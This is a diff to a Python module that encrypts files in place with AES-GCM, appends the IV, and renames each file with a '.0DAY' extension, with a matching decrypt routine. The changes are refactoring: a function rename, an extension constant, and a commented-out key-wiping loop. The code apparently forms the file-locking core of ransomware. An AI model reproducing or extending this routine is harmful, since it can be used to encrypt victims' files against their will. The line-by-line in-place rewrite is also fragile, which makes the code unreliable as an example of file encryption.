@@ -4,7 +4,9 @@ from Cryptodome import Random         # collision with Pycrypto/Pycryptodome pac
 import hashlib                        # Use pip (or conda) install cryptodomex.
 
 
-def writer(filepath, method, append_iv=None):
+EXT = '.0DAY'
+
+def _writer(filepath, method, append_iv=None):
   
   """
   This function will take the filepath and write
@@ -19,10 +21,12 @@ def writer(filepath, method, append_iv=None):
   path = os.path.normpath(filepath)
   os.chmod(path, stat.S_IRWXU)
   with open(path, 'rb+') as fh:
+
     for line in fh:
       new_line = method(line)
       fh.seek(-len(line), 1)
       fh.write(new_line)
+
     if append_iv:
       fh.seek(0,2)
       fh.write(append_iv)
@@ -45,9 +49,8 @@ def encrypt(filepath, key):
   """
   
   path = os.path.normpath(filepath)
-  ext = '.0day'
   
-  if path.endswith(ext):
+  if path.endswith(EXT):
     return
   
   try:
@@ -55,11 +58,11 @@ def encrypt(filepath, key):
     iv = Random.new().read(AES.block_size)
     cipher_gcm = AES.new(keyb, AES.MODE_GCM, iv)
     
-    writer(path, cipher_gcm.encrypt, append_iv=iv)
+    _writer(path, cipher_gcm.encrypt, append_iv=iv)
     
-    os.rename(path, path+ext)
+    os.rename(path, path+EXT)
     
-    for _ in range(100): keyb = os.urandom(16)
+    #for _ in range(100): keyb = os.urandom(16)
   except FileNotFoundError:
     pass
   
@@ -75,9 +78,8 @@ def decrypt(filepath, key):
   """
   
   path = os.path.normpath(filepath)
-  ext = '.0day'
   
-  if not path.endswith(ext):
+  if not path.endswith(EXT):
     return
   
   try:
@@ -90,12 +92,12 @@ def decrypt(filepath, key):
     keyb = hashlib.sha3_256(key.encode()).digest()
     cipher_gcm = AES.new(keyb, AES.MODE_GCM, iv)
     
-    writer(path, cipher_gcm.decrypt)
+    _writer(path, cipher_gcm.decrypt)
     
     original_path = os.path.splitext(path)[0]
     
     os.rename(path, original_path)
     
-    for _ in range(100): keyb = os.urandom(16)
+    #for _ in range(100): keyb = os.urandom(16)
   except FileNotFoundError:
     pass
